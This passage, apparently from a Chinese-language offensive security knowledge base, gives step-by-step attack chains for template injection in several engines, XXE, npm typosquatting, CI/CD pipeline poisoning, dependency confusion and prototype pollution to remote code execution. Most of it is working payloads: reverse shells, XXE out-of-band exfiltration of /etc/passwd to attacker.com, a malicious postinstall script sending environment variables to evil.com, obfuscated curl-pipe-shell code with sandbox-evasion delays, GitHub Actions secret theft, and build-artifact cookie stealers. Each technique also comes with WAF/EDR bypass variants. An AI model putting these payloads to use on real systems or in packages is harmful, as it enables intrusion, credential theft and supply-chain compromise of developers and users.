**前置条件：** 使用Mako模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Mako模板注入_
```
${7*7}
${self}
${self.module}
如果输出49或模块信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
${self.module.cache.util}
${self.module.cache.util.os}
${dir(self)}
```

**3. 3. 命令执行 - os模块**
_使用os模块执行命令_
```
${self.module.cache.util.os.popen("id").read()}
${self.module.cache.util.os.popen("whoami").read()}
${self.module.cache.util.os.system("id")}
```

**4. 4. 命令执行 - subprocess**
_使用subprocess执行命令_
```
<%
import subprocess
%>
${subprocess.check_output(["id","-a"])}
${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
${self.module.cache.util.os.popen("i"+"d").read()}
${self.module.cache.util.os.popen("who"+"ami").read()}
```

**2. 使用__import__**
_使用__import__导入模块_
```
${__import__("os").popen("id").read()}
${__import__("subprocess").check_output(["id"])}
```

**3. 使用getattr**
_使用getattr绕过_
```
${getattr(__import__("os"),"popen")("id").read()}
${getattr(getattr(__import__("os"),"popen")("id"),"read")()}
```

---

### Tornado模板注入  `ssti-tornado`
Tornado模板引擎注入攻击技术
子类：**Tornado** · tags: `ssti` `tornado` `python` `template`

**前置条件：** 使用Tornado模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Tornado模板注入_
```
{{7*7}}
{{handler}}
{{request}}
如果输出49或handler对象，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{{handler.settings}}
{{handler.application}}
{{request.headers}}
{{request.cookies}}
```

**3. 3. 命令执行 - os**
_使用os模块执行命令_
```
{% import os %}
{{os.popen("id").read()}}
{{os.popen("whoami").read()}}
{{os.system("id")}}
```

**4. 4. 命令执行 - subprocess**
_使用subprocess执行命令_
```
{% import subprocess %}
{{subprocess.check_output(["id","-a"])}}
{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
{% import os %}
{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
{% import os %}
{{os.popen("i"+"d").read()}}
{{os.popen("who"+"ami").read()}}
```

**2. 使用__import__**
_使用__import__导入模块_
```
{{__import__("os").popen("id").read()}}
{{__import__("subprocess").check_output(["id"])}}
```

**3. 使用handler**
_通过handler访问_
```
{{handler.application.settings}}
{{handler.get_status()}}
{{handler.request.remote_ip}}
```

---

### Django模板注入  `ssti-django`
Django模板引擎注入攻击技术
子类：**Django** · tags: `ssti` `django` `python` `template`

**前置条件：** 使用Django模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Django模板注入_
```
{{7*7}}
{% if 1=1 %}vulnerable{% endif %}
{{request}}
如果输出49或request对象，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{{request.META}}
{{request.user}}
{{request.session}}
{{settings.SECRET_KEY}}
```

**3. 3. 命令执行 - 通过settings**
_尝试通过settings访问_
```
{{settings.TEMPLATES}}
{{settings.DATABASES}}
# Django模板默认沙箱，难以直接执行命令
# 需要找到可利用的对象链
```

**4. 4. 命令执行 - 对象链**
_通过对象链访问_
```
{{request.user.groups.model._meta.apps}}
{{request.user.user_permissions.model._meta.apps}}
# 尝试访问Django内部对象
```

**5. 5. 敏感信息泄露**
_泄露敏感配置_
```
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{settings.ALLOWED_HOSTS}}
{{settings.DEBUG}}
```

**WAF/EDR 绕过变体：**

**1. 使用过滤器**
_使用Django过滤器_
```
{{request|length}}
{{settings.SECRET_KEY|default:""}}
{{request.META|dictsort:"key"}}
```

**2. 使用for循环**
_使用for循环遍历_
```
{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}
{% for k in settings.keys %}{{k}}{% endfor %}
```

---

### ERB模板注入  `ssti-erb`
ERB(Ruby)模板引擎注入攻击技术
子类：**ERB** · tags: `ssti` `erb` `ruby` `template`

**前置条件：** 使用ERB模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测ERB模板注入_
```
<%= 7*7 %>
<%= self %>
<%= __FILE__ %>
如果输出49或文件信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
<%= Dir.pwd %>
<%= ENV.inspect %>
<%= `id` %>
<%= File.read("/etc/passwd") %>
```

**3. 3. 命令执行 - 反引号**
_使用反引号执行命令_
```
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= `ls -la` %>
```

**4. 4. 命令执行 - system**  _[linux]_
_使用system/exec执行命令并获取反弹Shell_
```
<%= system("id") %>
<%= system("whoami") %>
<%= exec("id") %>
<%= IO.popen("id").read %>
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").then { |c| system(c) } %>
```

**2. 使用%语法**
_使用%x语法执行命令_
```
<%= %x(id) %>
<%= %x{whoami} %>
<%= %x[cat /etc/passwd] %>
```

**3. 使用Open3**
_使用Open3模块_
```
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>
```

---

### Pug/Jade模板注入  `ssti-pug`
Pug/Jade模板引擎注入攻击技术
子类：**Pug** · tags: `ssti` `pug` `jade` `nodejs` `template`

**前置条件：** 使用Pug/Jade模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Pug模板注入_
```
#{7*7}
#{this}
#{global}
如果输出49或global对象，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
#{process}
#{process.env}
#{global.process}
#{require}
```

**3. 3. 命令执行 - child_process**
_使用child_process执行命令_
```
- var exec = require("child_process").exec
#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}
- require("child_process").exec("id")
```

**4. 4. 命令执行 - execSync**
_使用execSync执行命令_
```
- var execSync = require("child_process").execSync
#{execSync("id").toString()}
#{require("child_process").execSync("id").toString()}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
- var cmd = "i" + "d"
#{require("child_process").execSync(cmd).toString()}
- var r = "require"
#{global[r]("child_process")}
```

**2. 使用global**
_使用global对象_
```
#{global.process.mainModule.require("child_process").execSync("id").toString()}
#{global["req"+"uire"]("child_process")}
```

**3. 使用this**
_使用this.constructor_
```
#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}
```

---

### · XXE实体注入

### XXE基础攻击  `xxe-basic`
XML外部实体注入基础攻击技术
子类：**基础攻击** · tags: `xxe` `xml` `external` `entity`

**前置条件：** 存在XML解析功能；外部实体未被禁用

**攻击链：**

**1. 1. 探测XXE**
_基础XXE测试_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**2. 2. 读取文件**  _[windows]_
_读取Windows文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

**3. 3. 读取PHP源码**
_使用PHP Filter读取源码_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

**4. 4. SSRF攻击**
_利用XXE进行SSRF_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**WAF/EDR 绕过变体：**

**1. 参数实体**
_使用参数实体绕过_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**2. 编码绕过**
_使用编码绕过_
```
<?xml version="1.0" encoding="UTF-16"?>
使用不同编码绕过WAF
```

---

### 盲注XXE攻击  `xxe-blind`
无回显的XXE攻击技术
子类：**盲注XXE** · tags: `xxe` `blind` `oob` `xml`

**前置条件：** 存在XML解析；无直接回显

**攻击链：**

**1. 1. 外部实体探测**
_使用外部实体探测_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>
```

**2. 2. 参数实体**
_使用参数实体_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```

**3. 3. OOB外带数据**
_OOB外带文件内容_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# xxe.dtd内容
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用UTF-16编码XML文档
绕过WAF检测
```

---

### XXE OOB外带攻击  `xxe-oob`
利用OOB技术外带XXE数据
子类：**OOB外带** · tags: `xxe` `oob` `exfiltration` `xml`

**前置条件：** 存在XXE漏洞；可发起外部请求

**攻击链：**

**1. 1. HTTP外带**
_HTTP外带数据_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

**2. 2. FTP外带**
_FTP外带数据_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

**3. 3. DNS外带**
_DNS外带_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
]>
<foo>&xxe;</foo>

# 或使用子域名
<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
```

**WAF/EDR 绕过变体：**

**1. 使用CDATA**
_CDATA包装_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```

---

### XXE+SSRF组合攻击  `xxe-ssrf`
利用XXE实现SSRF攻击
子类：**XXE+SSRF** · tags: `xxe` `ssrf` `combination` `xml`

**前置条件：** 存在XXE漏洞；内网可访问

**攻击链：**

**1. 1. 扫描内网端口**
_扫描内网端口_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

# 批量扫描
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
```

**2. 2. 访问内网服务**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<foo>&xxe;</foo>

# 访问Redis
# 访问内部API
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用不同编码格式绕过IP过滤
```

---

### XXE到RCE  `xxe-rce`
利用XXE实现远程代码执行
子类：**XXE到RCE** · tags: `xxe` `rce` `php` `expect`

**前置条件：** 存在XXE漏洞；PHP expect扩展加载

**攻击链：**

**1. 1. Expect扩展RCE**
_使用expect协议执行命令_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>

# 执行任意命令
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
```

**2. 2. 写入WebShell**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用Base64或其他编码绕过命令过滤
```

---

### XXE文件读取  `xxe-file-read`
利用XXE读取服务器文件
子类：**文件读取** · tags: `xxe` `file` `read` `lfi`

**前置条件：** 存在XXE漏洞；有文件读取权限

**攻击链：**

**1. 1. 读取Linux文件**  _[linux]_
_读取Linux系统文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///etc/shadow
file:///etc/hosts
file:///root/.ssh/id_rsa
file:///proc/self/environ
```

**2. 2. 读取Windows文件**  _[windows]_
_读取Windows系统文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
```

**3. 3. 读取Web配置**
_读取Web应用配置_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>

# 常见配置文件
file:///var/www/html/wp-config.php
file:///app/.env
file:///app/config/database.yml
```

**4. 4. 读取源代码**
_使用PHP Filter读取源码_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<foo>&xxe;</foo>
```

**WAF/EDR 绕过变体：**

**1. 使用参数实体**
_参数实体绕过_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY bar "%xxe;">
]>
<foo>&bar;</foo>
```

---

### XXE外部DTD利用  `xxe-dtd`
利用外部DTD文件进行XXE攻击
子类：**外部DTD** · tags: `xxe` `dtd` `external` `xml`

**前置条件：** 存在XXE漏洞；可访问外部DTD

**攻击链：**

**1. 1. 托管恶意DTD**
_创建恶意DTD文件_
```
# 在攻击者服务器创建evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**2. 2. 引用外部DTD**
_引用外部DTD文件_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```

**3. 3. 多步骤外带**
_处理特殊字符_
```
# evil.dtd - 多步骤外带
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```

**4. 4. 错误消息泄露**
_错误消息外带_
```
# 利用错误消息泄露数据
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

# 错误消息中会包含文件内容
```

**WAF/EDR 绕过变体：**

**1. 使用HTTPS**
_HTTPS绕过_
```
使用HTTPS托管DTD文件绕过HTTP过滤
```

---

### XLSX文件XXE  `xxe-xlsx`
利用XLSX文件进行XXE攻击
子类：**XLSX文件XXE** · tags: `xxe` `xlsx` `excel` `office`

**前置条件：** 应用解析XLSX文件；存在XXE漏洞

**攻击链：**

**1. 1. 解压XLSX文件**
_解压XLSX文件_
```
# XLSX本质是ZIP文件
unzip spreadsheet.xlsx

# 主要文件结构
xl/workbook.xml
xl/worksheets/sheet1.xml
xl/sharedStrings.xml
[Content_Types].xml
```

**2. 2. 注入XXE Payload**
```
# 修改xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="...">
&xxe;
</workbook>
```

**WAF/EDR 绕过变体：**

**1. 修改Content_Types**
_修改Content_Types_
```
修改[Content_Types].xml注入XXE
```

---

### DOCX文件XXE  `xxe-docx`
利用DOCX文件进行XXE攻击
子类：**DOCX文件XXE** · tags: `xxe` `docx` `word` `office`

**前置条件：** 应用解析DOCX文件；存在XXE漏洞

**攻击链：**

**1. 1. 解压DOCX文件**
_解压DOCX文件_
```
# DOCX本质是ZIP文件
unzip document.docx

# 主要文件结构
word/document.xml
word/_rels/document.xml.rels
[Content_Types].xml
```

**2. 2. 注入XXE Payload**
```
# 修改word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="...">
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:document>
```

**WAF/EDR 绕过变体：**

**1. 修改关系文件**
_修改关系文件_
```
修改_rels/.rels或document.xml.rels注入XXE
```

---

### · 供应链攻击

### NPM包名仿冒(Typosquatting)  `supply-typosquat`
通过注册与流行NPM包名高度相似的恶意包(如lodash→1odash, colors→co1ors)，诱导开发者误安装。恶意包在install/postinstall钩子中执行反弹Shell、窃取环境变量或植入后门。
子类：**包管理器投毒** · tags: `供应链` `NPM` `Typosquatting` `包投毒` `postinstall`

**前置条件：** NPM账号；了解目标项目依赖；恶意包基础设施

**攻击链：**

**1. 1. 侦察目标依赖**
_识别目标项目依赖的流行NPM包作为仿冒目标_
```
# 分析目标项目的package.json
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/package.json" | jq '.dependencies, .devDependencies'

# 查询高下载量包
npm search lodash --json | jq '.[0:5] | .[] | {name, description, version}'
```

**2. 2. 生成仿冒包名**
_生成与目标包名相似的多种变体并检查可用性_
```
# 常见Typosquatting变体生成
original="lodash"
echo "${original}" | python3 -c "
import sys
name=sys.stdin.read().strip()
# 字符替换: l->1, o->0
print(name.replace('l','1'))
# 连字符变体
print(name+'-utils')
print(name+'-js')
# 缺字/多字
print(name[:-1])
print(name+'s')
"

# 检查NPM可用性
for pkg in 1odash lodash-utils lodash-js lodas lodashs; do
  npm view $pkg 2>/dev/null && echo "$pkg: TAKEN" || echo "$pkg: AVAILABLE"
done
```

**3. 3. 构造恶意包**
_创建伪装成正常工具库的恶意NPM包，利用install钩子执行恶意代码_
```
# package.json中植入postinstall钩子
{
  "name": "1odash",
  "version": "1.0.0",
  "description": "Utility library for JavaScript",
  "scripts": {
    "preinstall": "node scripts/setup.js",
    "postinstall": "node scripts/telemetry.js"
  }
}

# scripts/telemetry.js —— 窃取环境变量
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  cwd: process.cwd(),
  hostname: require('os').hostname()
});
https.request({hostname:'evil.com',path:'/collect',method:'POST',headers:{'Content-Type':'application/json'}}, ()=>{}).end(data);
```

**4. 4. 检测与取证**
_审计当前项目依赖的安全性，识别可疑install钩子和异常包_
```
# 审计项目依赖安全
npm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity}'

# 检查postinstall钩子
find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {} \;

# 对比lock文件完整性
npm ci --dry-run 2>&1 | grep -i "warn\|error"

# Socket.dev检测恶意包
npx socket info lodash
```

**WAF/EDR 绕过变体：**

**1. 绕过NPM包安全检测**
_利用延迟执行、代码混淆和环境检测绕过自动化安全扫描_
```
# 延迟执行避开沙箱检测
setTimeout(() => {
  // 恶意代码在30秒后执行，绕过自动化分析超时
  require('child_process').exec('curl evil.com/c | sh')  # security-allowlist: curl-pipe-bash
}, 30000);

# 代码混淆
const _0x4f2a=['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
require(_0x4f2a[0]).exec('...');

# 环境检测——仅在CI/CD中触发
if(process.env.CI || process.env.GITHUB_ACTIONS) {
  // 仅攻击CI/CD环境
}
```

---

### CI/CD管道投毒  `supply-ci-poison`
通过恶意Pull Request、Actions注入或构建脚本篡改来攻击CI/CD管道。攻击者可窃取构建密钥、投毒构建产物或在部署流程中植入后门代码。
子类：**CI/CD攻击** · tags: `供应链` `CI/CD` `GitHub Actions` `Jenkins` `Pipeline`

**前置条件：** 目标使用公开CI/CD；可提交PR或Fork

**攻击链：**

**1. 1. 识别CI/CD配置**
_分析目标项目的CI/CD配置文件和密钥使用情况_
```
# 搜索GitHub Actions配置
curl -s "https://api.github.com/repos/{ORG}/{REPO}/contents/.github/workflows" \
  -H "Authorization: token {GITHUB_TOKEN}" | jq '.[].name'

# 分析工作流中的密钥使用
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/.github/workflows/ci.yml" | grep -E "secrets\.|\$\{\{.*\}\}"
```

**2. 2. PR触发的工作流注入**
_利用pull_request_target事件在主仓上下文中执行PR代码，窃取Secrets_
```
# 恶意 .github/workflows/pr-check.yml
name: PR Check
on:
  pull_request_target:  # 危险：在主仓上下文执行
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          # PR中的代码在主仓权限下执行
          echo ${{ secrets.DEPLOY_KEY }} | base64 -w0
          curl -X POST -d @<(env) https://evil.com/collect
```

**3. 3. Actions表达式注入**
_通过PR标题/Issue评论注入命令到GitHub Actions的run步骤中_
```
# PR标题注入
# 创建标题为以下内容的PR:
# test`curl evil.com/s|sh`  # security-allowlist: curl-pipe-bash

# 工作流中若有如下写法则存在注入：
run: echo "Checking PR: ${{ github.event.pull_request.title }}"

# Issue评论注入
# 评论内容:
# "); curl evil.com/steal?token=$GITHUB_TOKEN #

# 注入点搜索
grep -rn '\${{.*github\.event\.' .github/workflows/
```

**4. 4. 构建产物投毒**
_在构建过程中向产出物注入恶意代码（如Cookie窃取脚本）_
```
# 篡改构建脚本注入后门
# 修改 package.json build脚本
"scripts": {
  "build": "react-scripts build && node inject.js"
}

# inject.js——在构建产物中注入代码
const fs = require('fs');
const buildDir = './build/static/js';
fs.readdirSync(buildDir).filter(f=>f.endsWith('.js')).forEach(f => {
  let code = fs.readFileSync(`${buildDir}/${f}`, 'utf8');
  code += '\n;fetch("https://evil.com/log?c="+document.cookie);';
  fs.writeFileSync(`${buildDir}/${f}`, code);
});
```

**WAF/EDR 绕过变体：**

**1. 绕过GitHub Actions安全限制**
_通过间接触发、第三方Action和Python外带绕过日志审计和安全策略_
```
# 使用workflow_dispatch间接触发
# 避免直接在PR中暴露恶意代码
on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: true
steps:
  - run: ${{ github.event.inputs.cmd }}

# 使用第三方Action作为跳板
- uses: malicious-org/innocent-name@main
  # 恶意Action内部窃取secrets

# 环境变量泄露——避免直接echo
- run: |
    python3 -c "import os,urllib.request;urllib.request.urlopen(urllib.request.Request('https://evil.com',data=str(dict(os.environ)).encode()))"
```

---

### 依赖混淆攻击  `supply-dependency-confusion`
利用包管理器在公共注册表和私有注册表之间的解析优先级漏洞。当企业使用内部包名时，攻击者在公共NPM/PyPI注册更高版本号的同名包，包管理器会优先安装公共高版本包从而执行恶意代码。
子类：**依赖混淆** · tags: `供应链` `依赖混淆` `NPM` `PyPI` `Dependency Confusion`

**前置条件：** 已知目标内部包名；公共注册表账号

**攻击链：**

**1. 1. 发现内部包名**
_从前端代码、泄露的lock文件和错误信息中发现目标使用的内部包名_
```
# 从JavaScript源码中提取import路径
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "require\([\x27\x22]@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+[\x27\x22]\)" | sort -u

# 从package-lock.json泄露中搜索
curl -s "https://{TARGET}/package-lock.json" 2>/dev/null | jq 'keys' 

# GitHub搜索私有包名
# 搜索: "@internal-company/" site:github.com

# 从错误页面/源码注释发现
curl -s "https://{TARGET}" | grep -oE "@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"
```

**2. 2. 在公共注册表注册同名包**
_在NPM公共注册表发布与目标内部包同名但版本号更高的包_
```
# 创建与内部包同名的公共包
mkdir dependency-confusion-test && cd dependency-confusion-test
npm init -y
# 设置超高版本号
npm version 99.0.0

# 添加无害的检测代码(非恶意)
cat > index.js << 'EOF'
const os = require("os");
const dns = require("dns");
const pkg = require("./package.json");
// 仅DNS回调确认安装——无数据外泄
dns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});
EOF

npm publish --access public
```

**3. 3. 监控DNS回调确认命中**
_监控DNS/HTTP回调确认目标环境安装了公共注册表上的恶意包_
```
# 使用Burp Collaborator或自建DNS服务器监控
# Interactsh监控
interactsh-client -v 2>&1 | grep "dep-test"

# 自建DNS记录
sudo tcpdump -i eth0 port 53 -l | grep "dep-test"

# 也可通过HTTP回调
python3 -m http.server 8080 &
# 等待目标CI/CD管道安装包时触发回调
```

**4. 4. 影响评估与报告**
_验证包管理器的解析优先级行为并评估影响范围_
```
# 验证受影响的包管理器行为
# NPM: 默认优先公共高版本
npm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep "resolved"

# Python/pip同理
pip install target-corp-utils --index-url https://pypi.org/simple/ -v 2>&1 | grep "Downloading"

# 检查是否配置了registry scope
npm config get @target-corp:registry
```

**WAF/EDR 绕过变体：**

**1. 绕过包名注册限制**
_利用unscoped包名、跨包管理器和prerelease版本扩大攻击面_
```
# 如果目标使用unscoped包名
# 直接注册同名公共包(无@scope前缀更容易混淆)

# 跨包管理器攻击
# 目标用NPM但也尝试PyPI
pip install target-internal-lib  # pip没有scope概念

# 使用prerelease标签
npm version 99.0.0-alpha.1
# 某些配置会匹配 >=1.0.0 范围包括prerelease
```

---

### · 原型链污染

### 服务端原型链污染到RCE  `proto-server-rce`
通过污染JavaScript对象原型链(__proto__/constructor.prototype)注入恶意属性，在Node.js服务端利用child_process或EJS/Pug等模板引擎的gadget链实现远程代码执行。
子类：**服务端利用** · tags: `原型链` `Prototype Pollution` `RCE` `Node.js` `__proto__`

**前置条件：** 目标使用Node.js；存在JSON合并/深拷贝操作；可控JSON输入

**攻击链：**

**1. 1. 检测原型链污染点**
_通过__proto__和constructor.prototype两种方式测试是否存在原型链污染_
```
# 发送__proto__污染测试
curl -X POST "https://{TARGET}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "test123"}}'

# constructor方式
curl -X POST "https://{TARGET}/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "test123"}}}'

# 验证污染是否成功(通过报错/行为变化)
curl "https://{TARGET}/api/debug" | grep "polluted"
```

**2. 2. EJS模板引擎RCE Gadget**
_利用EJS模板引擎的outputFunctionName/escapeFunction gadget实现RCE_
```
# EJS RCE gadget——污染outputFunctionName
curl -X POST "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# 触发模板渲染
curl "https://{TARGET}/dashboard"

# EJS client参数RCE
curl -X POST "https://{TARGET}/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
```

**3. 3. Pug模板引擎RCE Gadget**
_利用Pug和Handlebars模板引擎的已知gadget链实现代码执行_
```
# Pug/Jade RCE gadget——污染block属性
curl -X POST "https://{TARGET}/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require(\"child_process\").execSync(\"curl evil.com/rce\");//"}}}'

# Handlebars RCE gadget
curl -X POST "https://{TARGET}/api/template" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"allowedProtoMethods": {"__defineGetter__": true}, "allowedProtoProperties": {"__defineGetter__": true}}}'
```

**4. 4. 通用DoS/信息泄露Gadget**
_利用通用gadget造成DoS、状态码篡改、环境变量注入和任意文件读取_
```
# 污染toString造成异常
{"__proto__": {"toString": null}}

# 污染status属性改变响应
{"__proto__": {"status": 500}}

# 污染环境变量注入
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}

# 污染shell属性(配合child_process.exec)
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\"))//"}}}
```

**WAF/EDR 绕过变体：**

**1. 绕过__proto__关键字过滤**
_通过Unicode编码、constructor路径、嵌套对象和JSON5语法绕过__proto__过滤_
```
# Unicode编码
{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}

# constructor路径
{"constructor": {"prototype": {"polluted": true}}}

# 嵌套路径
{"a": {"__proto__": {"polluted": true}}}

# 使用JSON5语法(如果支持)
{__proto__: {polluted: true}}

# 数组原型污染
{"__proto__": [], "length": 1, "0": "exploit"}
```

---

### 客户端原型链污染到XSS  `proto-client-xss`
通过URL参数、postMessage或DOM操作污染前端JavaScript原型链，利用jQuery/DOM操作库的gadget在客户端实现XSS。攻击者可通过精心构造的URL链接诱导受害者触发漏洞。
